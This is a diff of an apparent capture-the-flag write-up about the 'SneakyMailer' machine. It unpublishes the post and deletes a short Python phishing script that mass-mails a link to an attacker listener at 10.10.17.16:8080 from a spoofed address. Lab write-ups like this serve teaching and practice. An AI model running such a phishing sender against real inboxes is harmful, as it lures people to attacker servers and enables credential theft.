@@ -1,5 +1,5 @@
 ---
-published: true
+published: false
 ---
 <img src="https://i.ibb.co/2tgV0yX/sneakymailer.png" alt="sneakymailer" border="0">
 
@@ -112,27 +112,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1080.13 sec</pre>
 
 <h1>Phishing script<h1>
 
-<tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">os</span>
-<span class="k">def</span> <span class="nf">open_ressources</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
-    <span class="k">return</span> <span class="p">[</span><span class="n">item</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">).</span><span class="n">readlines</span><span class="p">()]</span>
-<span class="n">wordlist</span> <span class="o">=</span> <span class="n">open_ressources</span><span class="p">(</span><span class="s">"emails"</span><span class="p">)</span>
-
-<span class="k">for</span> <span class="n">emails</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[+]Sending email to "</span> <span class="o">+</span> <span class="n">emails</span>
-        <span class="n">command</span> <span class="o">=</span> <span class="s">'swaks --from "angelicaramos@sneakymailer.htb" --body "http://10.10.17.16:8080" --to '</span> <span class="o">+</span> <span class="n">emails</span> <span class="o">+</span> <span class="s">" &gt; /dev/null"</span>
-        <span class="c1">#print command
-</span>        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
-</pre></td></tr>
+ 
   
   
   
